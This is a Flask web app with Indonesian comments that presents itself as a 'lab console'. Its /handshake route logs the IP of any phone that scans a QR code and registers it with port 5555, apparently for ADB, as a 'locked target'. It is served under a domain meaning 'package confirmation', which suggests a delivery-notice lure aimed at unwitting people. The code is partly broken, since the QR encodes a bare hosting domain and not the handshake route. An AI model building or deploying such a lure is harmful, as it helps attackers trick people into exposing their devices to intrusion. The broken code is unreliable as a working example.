from flask import Flask, request, jsonify, render_template_string, send_file
import os
import io

try:
    import qrcode
except ImportError:
    pass

app = Flask(__name__)

# Memori awan sementara untuk mencatat IP perangkat target yang aktif
device_registry = {}

# ANTARMUKA DASHBOARD ONLINE UTK MONITOR PC LAB (SUDAH DIPERBAIKI TOTAL)
HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>AMETHA LAB - Cloud Command Console</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: black; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .container { max-width: 600px; margin: auto; border: 1px solid #00ff00; padding: 20px; box-shadow: 0 0 15px #00ff00; }
        h1, h2 { color: #00ff00; text-transform: uppercase; }
        .status-box { background-color: #0d0d0d; padding: 15px; margin: 15px 0; border-left: 5px solid #00ff00; text-align: left; }
        .btn { background-color: #1a1a1a; color: #00ff00; border: 1px solid #00ff00; padding: 10px 20px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 15px; }
        .btn:hover { background-color: #00ff00; color: black; }
    </style>
    <script>
        setInterval(async () => {
            let res = await fetch('/get_target');
            let data = await res.json();
            if(data.status === 'ready') {
                document.getElementById('target-status').innerText = "✅ PERANGKAT TERKUNCI: " + data.target;
                document.getElementById('target-status').style.color = "#00ff00";
            } else {
                document.getElementById('target-status').innerText = "⏳ Menunggu Jabat Tangan Jarak Jauh...";
                document.getElementById('target-status').style.color = "orange";
            }
        }, 2000);
    </script>
</head>
<body>
    <div class="container">
        <h1>[ AMETHA LAB CONSOLE ]</h1>
        <p>Sistem Pemantau Terintegrasi Awan - Mode Server Online</p>
        <div class="status-box">
            <h2>Status Koneksi Jaringan:</h2>
            <div id="target-status" style="font-weight: bold; font-size: 1.1em;">⏳ Menunggu Jabat Tangan Jarak Jauh...</div>
        </div>
        <div class="status-box">
            <h2>Parameter Gateway:</h2>
            <p>Server URL: <strong>konfirmasi-paket.onrender.com</strong></p>
            <p>Payload Action: <strong>/handshake</strong></p>
        </div>
        <a href="/generate_qr" target="_blank" class="btn">Buka QR Code Generator</a>
    </div>
</body>
</html>
"""

@app.route('/')
def index_dashboard():
    return render_template_string(HTML_DASHBOARD)

@app.route('/handshake', methods=['GET', 'POST'])
def background_handshake():
    """Menerima ketukan data otomatis dari browser HP target saat memindai/mengklik QR Code."""
    device_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if device_ip and ',' in device_ip:
        device_ip = device_ip.split(',')[0].strip()
        
    device_port = "5555"
    
    if device_ip:
        target_address = f"{device_ip}:{device_port}"
        device_registry["active_target"] = target_address
        
        return f"""
        <html>
            <head><title>Handshake Success</title></head>
            <body style="background-color: black; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px;">
                <h2>[ AMETHA LAB SYSTEM ]</h2>
                <p>✅ Jabat tangan internet berhasil terkirim ke PC Lab.</p>
                <p>Gateway Target Terkunci: {target_address}</p>
                <p>Silakan kembali ke monitor lab. Koneksi sedang diproses...</p>
            </body>
        </html>
        """, 200
        
    return jsonify({"status": "failed", "message": "No IP detected"}), 400

@app.route('/get_target', methods=['GET'])
def get_target_device():
    target = device_registry.get("active_target", "")
    if target:
        return jsonify({"status": "ready", "target": target}), 200
    return jsonify({"status": "waiting", "target": ""}), 200

@app.route('/generate_qr', methods=['GET'])
def serve_qr_code_image():
    """Otomatis menghasilkan gambar QR Code sakti berbasis internet publik Render."""
    # KUNCI STRING BERSIH TANPA FORMAT VARIABEL GANDA
    qr_string = "https://onrender.com"
    
    qr_img = qrcode.make(qr_string)
    img_byte_arr = io.BytesIO()
    qr_img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    return send_file(img_byte_arr, mimetype='image/png')

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
